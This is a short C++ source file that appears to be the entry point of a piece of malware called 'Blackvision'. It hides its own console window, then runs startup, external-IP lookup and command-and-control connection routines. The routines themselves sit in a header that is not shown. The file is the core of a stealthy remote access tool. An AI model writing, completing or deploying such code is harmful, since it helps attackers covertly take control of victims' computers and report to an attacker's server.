//#include "pch.h"
#include "blackvision.h"

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	Blackvision bv;
	bv.startup();
	bv.Wanip();
	bv.C2Connect();
	return 0;
}
